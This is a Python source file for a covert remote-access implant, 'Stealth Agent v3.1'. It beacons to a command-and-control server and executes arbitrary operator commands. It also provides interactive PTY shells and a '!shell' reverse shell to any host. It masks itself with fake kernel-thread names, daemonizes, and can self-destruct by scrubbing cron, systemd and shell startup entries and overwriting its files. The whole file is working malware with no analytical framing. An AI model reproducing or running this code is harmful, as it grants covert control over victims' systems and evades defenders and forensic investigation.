#!/usr/bin/env python3
"""
6319 Stealth Agent v3.1 - Beacon Mode
- Minimal network footprint (beacon with jitter)
- Sleep/Go Dark commands
- Self-destruct capability  
- Full argv/process masking
- PTY support for interactive sessions
"""

import socket
import json
import hashlib
import subprocess
import os
import sys
import platform
import getpass
import time
import select
import struct
import pty
import fcntl
import termios
import signal
import random
import shutil
import glob as globmod

try:
    import ctypes
    HAS_CTYPES = True
except ImportError:
    HAS_CTYPES = False

try:
    import nacl.secret
except ImportError:
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pynacl', '-q', '--break-system-packages'], 
                   capture_output=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pynacl', '-q', '--user'], 
                   capture_output=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    import nacl.secret

KERNEL_NAMES = ["[kworker/0:0]", "[ksmd]", "[kswapd0]", "[watchdogd]", "[rcu_preempt]", 
                "[migration/0]", "[ksoftirqd/0]", "[kdevtmpfs]", "[netns]", "[khungtaskd]"]

INSTALL_DIRS = [
    os.path.expanduser("~/.config/.htop"),
    os.path.expanduser("~/.local/share/.dbus"),
    os.path.expanduser("~/.cache/.fontconfig"),
    "/dev/shm/.udevd",
    "/tmp/.X11-unix/.0"
]


class SecureChannel:
    def __init__(self, secret):
        self.box = nacl.secret.SecretBox(hashlib.sha256(secret.encode()).digest())
    
    def encrypt_frame(self, data):
        ct = self.box.encrypt(json.dumps(data).encode())
        return len(ct).to_bytes(4, 'big') + ct
    
    def decrypt_frame(self, sock):
        try:
            sock.settimeout(30)
            lb = b''
            while len(lb) < 4:
                c = sock.recv(4 - len(lb))
                if not c:
                    return None
                lb += c
            length = int.from_bytes(lb, 'big')
            if length > 10 * 1024 * 1024:
                return None
            data = b''
            while len(data) < length:
                c = sock.recv(min(8192, length - len(data)))
                if not c:
                    return None
                data += c
            return json.loads(self.box.decrypt(data))
        except:
            return None


class PTYSession:
    def __init__(self, sid, cols=80, rows=24, cwd=None):
        self.session_id = sid
        self.master_fd, slave_fd = pty.openpty()
        env = os.environ.copy()
        env['TERM'] = 'xterm-256color'
        env['COLUMNS'] = str(cols)
        env['LINES'] = str(rows)
        self.pid = os.fork()
        if self.pid == 0:
            os.setsid()
            os.dup2(slave_fd, 0)
            os.dup2(slave_fd, 1)
            os.dup2(slave_fd, 2)
            os.close(self.master_fd)
            os.close(slave_fd)
            if cwd and os.path.isdir(cwd):
                os.chdir(cwd)
            sh = '/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'
            os.execve(sh, [sh, '-i'], env)
        os.close(slave_fd)
        fl = fcntl.fcntl(self.master_fd, fcntl.F_GETFL)
        fcntl.fcntl(self.master_fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
        self.resize(cols, rows)
        self.alive = True
    
    def resize(self, cols, rows):
        try:
            fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, struct.pack('HHHH', rows, cols, 0, 0))
            os.kill(self.pid, signal.SIGWINCH)
        except:
            pass
    
    def write(self, data):
        try:
            os.write(self.master_fd, data.encode() if isinstance(data, str) else data)
            return True
        except:
            return False
    
    def read(self, timeout=0.01):
        try:
            r, _, _ = select.select([self.master_fd], [], [], timeout)
            if self.master_fd in r:
                return os.read(self.master_fd, 8192)
        except:
            pass
        return None
    
    def close(self):
        self.alive = False
        try:
            os.close(self.master_fd)
        except:
            pass
        try:
            os.kill(self.pid, signal.SIGTERM)
            os.waitpid(self.pid, os.WNOHANG)
        except:
            pass


def hide_process(name):
    """Hide process name using safe techniques only"""
    if HAS_CTYPES:
        try:
            libc = ctypes.CDLL('libc.so.6')
            libc.prctl(15, name.encode(), 0, 0, 0)
        except:
            pass
    
    try:
        with open('/proc/self/comm', 'w') as f:
            f.write(name[:15])
    except:
        pass


def hide_argv():
    """Clear sys.argv safely"""
    sys.argv = ['']


def daemonize():
    """Double-fork daemon with full fd cleanup"""
    try:
        if os.fork() > 0:
            os._exit(0)
    except:
        pass
    
    os.setsid()
    os.umask(0)
    
    try:
        if os.fork() > 0:
            os._exit(0)
    except:
        pass
    
    sys.stdout.flush()
    sys.stderr.flush()
    
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'a+') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())
    
    for fd in range(3, 1024):
        try:
            os.close(fd)
        except:
            pass


def self_destruct():
    """Remove all traces: files, cron, systemd, memory"""
    my_pid = os.getpid()
    
    for pattern in ['defunct', '6319', 'htop', '.dbus-session', '.fontconfig', 'agent_stealth', 'C2_HOST', 'C2_PORT']:
        try:
            subprocess.run(['pkill', '-9', '-f', pattern], 
                         capture_output=True, timeout=5)
        except:
            pass
    
    try:
        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
        if result.returncode == 0:
            lines = [l for l in result.stdout.split('\n') 
                    if '6319' not in l and 'defunct' not in l and 'htop' not in l 
                    and '.fontconfig' not in l and '.dbus' not in l and 'agent' not in l.lower()]
            subprocess.run(['crontab', '-'], input='\n'.join(lines), 
                         text=True, capture_output=True)
    except:
        pass
    
    systemd_user = os.path.expanduser("~/.config/systemd/user")
    for service in ['dbus-session.service', '6319.service']:
        service_path = os.path.join(systemd_user, service)
        if os.path.exists(service_path):
            try:
                subprocess.run(['systemctl', '--user', 'stop', service], capture_output=True)
                subprocess.run(['systemctl', '--user', 'disable', service], capture_output=True)
                os.remove(service_path)
            except:
                pass
    
    for rc in ['.bashrc', '.zshrc', '.profile', '.bash_profile']:
        rc_path = os.path.expanduser(f"~/{rc}")
        if os.path.exists(rc_path):
            try:
                with open(rc_path, 'r') as f:
                    lines = f.readlines()
                with open(rc_path, 'w') as f:
                    for line in lines:
                        if 'defunct' not in line and '6319' not in line and '.htop' not in line:
                            f.write(line)
            except:
                pass
    
    for install_dir in INSTALL_DIRS:
        if os.path.exists(install_dir):
            try:
                for root, dirs, files in os.walk(install_dir):
                    for f in files:
                        fpath = os.path.join(root, f)
                        try:
                            size = os.path.getsize(fpath)
                            with open(fpath, 'wb') as fp:
                                fp.write(os.urandom(size))
                        except:
                            pass
                shutil.rmtree(install_dir, ignore_errors=True)
            except:
                pass
    
    for pattern in ['/tmp/.*6319*', '/tmp/.*defunct*', '/dev/shm/.*']:
        for f in globmod.glob(pattern):
            try:
                if os.path.isfile(f):
                    os.remove(f)
                elif os.path.isdir(f):
                    shutil.rmtree(f, ignore_errors=True)
            except:
                pass
    
    os._exit(0)


def log_debug(msg):
    """Write debug to temp file"""
    try:
        with open('/tmp/.d6319.log', 'a') as f:
            f.write(f"{time.strftime('%H:%M:%S')} {msg}\n")
    except:
        pass


def beacon_check(host, port, secret, client_info):
    """Quick beacon: connect, check for commands, disconnect"""
    sock = None
    log_debug(f"beacon_check: {host}:{port}")
    try:
        sock = socket.socket()
        sock.settimeout(10)
        log_debug(f"connecting...")
        sock.connect((host, port))
        log_debug(f"connected, sending init")
        
        init = json.dumps({'secret': secret, 'mode': 'beacon'}).encode()
        sock.sendall(len(init).to_bytes(4, 'big') + init)
        log_debug(f"init sent, sending client_info")
        
        ch = SecureChannel(secret)
        sock.sendall(ch.encrypt_frame(client_info))
        log_debug(f"client_info sent, waiting response")
        
        resp = ch.decrypt_frame(sock)
        log_debug(f"resp: {resp}")
        if not resp:
            log_debug("no response, returning")
            return None, 0
        
        has_work = resp.get('has_work', False)
        sleep_override = resp.get('sleep', 0)
        commands = resp.get('commands', [])
        
        sock.close()
        log_debug(f"has_work={has_work}, commands={commands}")
        
        for cmd in commands:
            if cmd.get('type') == 'self_destruct':
                self_destruct()
            elif cmd.get('type') == 'connect_now':
                return 'connect_now', 0
            elif cmd.get('type') == 'sleep':
                return 'sleep', cmd.get('seconds', 3600)
            elif cmd.get('type') == 'go_dark':
                return 'go_dark', cmd.get('seconds', 86400)
        
        return has_work, sleep_override
        
    except Exception as e:
        log_debug(f"ERROR: {type(e).__name__}: {e}")
        return None, 0
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass


def interactive_session(host, port, secret, client_info):
    """Full interactive session with PTY support"""
    sock = None
    pty_sessions = {}
    cwd = os.path.expanduser('~')
    
    try:
        sock = socket.socket()
        sock.settimeout(30)
        sock.connect((host, port))
        
        init = json.dumps({'secret': secret, 'mode': 'interactive'}).encode()
        sock.sendall(len(init).to_bytes(4, 'big') + init)
        
        ch = SecureChannel(secret)
        sock.sendall(ch.encrypt_frame(client_info))
        
        resp = ch.decrypt_frame(sock)
        if not resp:
            return
        
        sock.setblocking(False)
        
        while True:
            readable = [sock] + [s.master_fd for s in pty_sessions.values() if s.alive]
            
            try:
                r, _, _ = select.select(readable, [], [], 0.1)
            except:
                break
            
            for sid, session in list(pty_sessions.items()):
                if session.alive and session.master_fd in r:
                    data = session.read(0)
                    if data:
                        sock.setblocking(True)
                        sock.sendall(ch.encrypt_frame({
                            'type': 'pty_data',
                            'session_id': sid,
                            'data': data.decode('utf-8', errors='replace')
                        }))
                        sock.setblocking(False)
            
            if sock in r:
                sock.setblocking(True)
                msg = ch.decrypt_frame(sock)
                sock.setblocking(False)
                
                if not msg:
                    break
                
                mt = msg.get('type', msg.get('cmd', 'exec'))
                
                if mt == 'ping':
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'status': 'pong'}))
                    sock.setblocking(False)
                
                elif mt == 'disconnect':
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'status': 'disconnected'}))
                    sock.close()
                    return ('disconnect', 0)
                
                elif mt == 'sleep':
                    minutes = msg.get('minutes', 60)
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'status': 'sleeping', 'minutes': minutes}))
                    sock.close()
                    return ('sleep', minutes * 60)
                
                elif mt == 'go_dark':
                    hours = msg.get('hours', 24)
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'status': 'going_dark', 'hours': hours}))
                    sock.close()
                    return ('go_dark', hours * 3600)
                
                elif mt == 'self_destruct':
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'status': 'destroying'}))
                    sock.close()
                    self_destruct()
                
                elif mt == 'exec':
                    cmd = msg.get('data', '').strip()
                    sock.setblocking(True)
                    try:
                        if cmd.startswith('cd '):
                            nd = cmd[3:].strip()
                            nd = os.path.expanduser(nd)
                            if not os.path.isabs(nd):
                                nd = os.path.join(cwd, nd)
                            nd = os.path.normpath(nd)
                            if os.path.isdir(nd):
                                cwd = nd
                                sock.sendall(ch.encrypt_frame({
                                    'stdout': f'Changed to {cwd}\n',
                                    'stderr': '',
                                    'code': 0
                                }))
                            else:
                                sock.sendall(ch.encrypt_frame({
                                    'stdout': '',
                                    'stderr': f'No such directory: {nd}\n',
                                    'code': 1
                                }))
                        elif cmd.startswith('!shell '):
                            pts = cmd[7:].strip().split(':')
                            rh, rp = pts[0], int(pts[1]) if len(pts) > 1 else 4444
                            if os.fork() == 0:
                                try:
                                    s2 = socket.socket()
                                    s2.connect((rh, rp))
                                    os.dup2(s2.fileno(), 0)
                                    os.dup2(s2.fileno(), 1)
                                    os.dup2(s2.fileno(), 2)
                                    pty.spawn('/bin/bash')
                                except:
                                    pass
                                os._exit(0)
                            sock.sendall(ch.encrypt_frame({
                                'stdout': f'Reverse shell to {rh}:{rp}\n',
                                'stderr': '',
                                'code': 0
                            }))
                        else:
                            r = subprocess.run(
                                f'cd {cwd} && {cmd}',
                                shell=True,
                                capture_output=True,
                                timeout=300
                            )
                            sock.sendall(ch.encrypt_frame({
                                'stdout': r.stdout.decode(errors='replace'),
                                'stderr': r.stderr.decode(errors='replace'),
                                'code': r.returncode
                            }))
                    except Exception as e:
                        sock.sendall(ch.encrypt_frame({'error': str(e)}))
                    sock.setblocking(False)
                
                elif mt == 'pty_open':
                    sid = msg.get('session_id')
                    cols, rows = msg.get('cols', 80), msg.get('rows', 24)
                    pty_sessions[sid] = PTYSession(sid, cols, rows, cwd)
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'type': 'pty_opened', 'session_id': sid}))
                    sock.setblocking(False)
                
                elif mt == 'pty_data':
                    sid = msg.get('session_id')
                    if sid in pty_sessions:
                        pty_sessions[sid].write(msg.get('data', ''))
                
                elif mt == 'pty_resize':
                    sid = msg.get('session_id')
                    if sid in pty_sessions:
                        pty_sessions[sid].resize(msg.get('cols', 80), msg.get('rows', 24))
                
                elif mt == 'pty_close':
                    sid = msg.get('session_id')
                    if sid in pty_sessions:
                        pty_sessions[sid].close()
                        sock.setblocking(True)
                        sock.sendall(ch.encrypt_frame({
                            'type': 'pty_exit',
                            'session_id': sid,
                            'code': 0
                        }))
                        sock.setblocking(False)
                        del pty_sessions[sid]
            
            for sid, session in list(pty_sessions.items()):
                try:
                    pid, status = os.waitpid(session.pid, os.WNOHANG)
                    if pid != 0:
                        session.alive = False
                        sock.setblocking(True)
                        sock.sendall(ch.encrypt_frame({
                            'type': 'pty_exit',
                            'session_id': sid,
                            'code': os.WEXITSTATUS(status) if os.WIFEXITED(status) else -1
                        }))
                        sock.setblocking(False)
                        del pty_sessions[sid]
                except:
                    pass
            
                
    except:
        pass
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
        for s in pty_sessions.values():
            s.close()


def main():
    log_debug("main() started")
    host = os.environ.get('SYNC_HOST', os.environ.get('C2_HOST', 'localhost'))
    port = int(os.environ.get('SYNC_PORT', os.environ.get('C2_PORT', '6318')))
    secret = os.environ.get('TOKEN', os.environ.get('SECRET', ''))
    hidden = os.environ.get('PNAME', os.environ.get('HIDDEN_NAME', random.choice(KERNEL_NAMES)))
    stealth = os.environ.get('QUIET', os.environ.get('STEALTH', '0')) == '1'
    beacon_mode = os.environ.get('BEACON_MODE', '1') == '1'
    channel = os.environ.get('MODE', os.environ.get('CHANNEL', 'stealth'))
    
    log_debug(f"host={host} port={port} secret={secret[:8] if secret else 'EMPTY'}... stealth={stealth} beacon_mode={beacon_mode} channel={channel}")
    
    if not secret:
        log_debug("ERROR: no secret, exiting")
        return
    
    if stealth:
        log_debug("entering daemonize()")
        daemonize()
        log_debug("after daemonize()")
    
    hide_process(hidden)
    hide_argv()
    
    client_info = {
        'hostname': platform.node(),
        'os': f'{platform.system()} {platform.release()}',
        'user': getpass.getuser(),
        'arch': platform.machine(),
        'pid': os.getpid(),
        'hidden_name': hidden,
        'pty_support': True,
        'beacon_mode': beacon_mode,
        'channel': channel
    }
    
    log_debug(f"entering main loop, beacon_mode={beacon_mode}")
    
    base_sleep = 300
    max_sleep = 900
    min_sleep = 180
    
    while True:
        try:
            log_debug(f"loop iteration, beacon_mode={beacon_mode}")
            if beacon_mode:
                result, delay = beacon_check(host, port, secret, client_info)
                
                if result in ('sleep', 'go_dark') and delay > 0:
                    time.sleep(delay)
                    continue
                
                if result == 'connect_now':
                    session_result = interactive_session(host, port, secret, client_info)
                    
                    if session_result:
                        action, sleep_time = session_result
                        if action in ('sleep', 'go_dark') and sleep_time > 0:
                            time.sleep(sleep_time)
                            continue
                
                jitter = random.randint(-60, 60)
                sleep_time = max(min_sleep, min(max_sleep, base_sleep + jitter))
                time.sleep(sleep_time)
                
            else:
                log_debug(f"calling interactive_session({host}:{port})")
                try:
                    session_result = interactive_session(host, port, secret, client_info)
                    log_debug(f"session_result={session_result}")
                except Exception as e:
                    log_debug(f"interactive_session ERROR: {type(e).__name__}: {e}")
                    session_result = None
                
                if session_result:
                    action, delay = session_result
                    log_debug(f"action={action}, delay={delay}")
                    if action in ('sleep', 'go_dark') and delay > 0:
                        time.sleep(delay)
                        continue
                    elif action == 'disconnect':
                        time.sleep(random.randint(5, 15))
                        continue
                
                log_debug("sleeping 5-15s before reconnect")
                time.sleep(random.randint(5, 15))
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            log_debug(f"main loop ERROR: {type(e).__name__}: {e}")
            time.sleep(random.randint(30, 90))


if __name__ == '__main__':
    main()
